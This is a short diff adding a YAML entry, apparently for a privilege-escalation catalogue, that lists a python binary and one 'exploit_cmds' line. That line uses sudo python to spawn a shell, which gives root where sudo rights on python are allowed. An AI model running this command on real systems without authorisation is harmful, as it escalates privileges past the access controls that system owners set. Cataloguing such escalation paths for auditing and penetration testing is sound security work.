@@ -1,0 +1,4 @@
+name: python
+binary_path: /usr/bin/python
+exploit_cmds:
+- sudo /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh")'
